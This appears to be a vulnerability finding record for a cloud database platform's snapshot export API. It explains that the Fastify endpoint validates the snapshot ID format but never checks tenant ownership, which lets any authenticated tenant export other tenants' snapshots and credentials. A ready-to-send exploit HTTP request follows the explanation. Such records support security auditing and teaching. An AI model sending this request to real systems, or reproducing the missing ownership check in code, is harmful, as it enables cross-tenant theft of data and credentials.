diagnosis: The endpoint relies on Fastify's JSON Schema to validate snapshot ID format, but does not verify that the requested database snapshot belongs to the authenticated customer's cloud tenancy. Any authenticated tenant can export database snapshots containing sensitive corporate data and database credentials of other cloud tenants.
exploit_request:
POST /api/backups/snapshots/snap-09fa41c8821d/export HTTP/1.1
Host: cloud.dbplatform.io
Authorization: Bearer <tenant_jwt>
Content-Length: 0
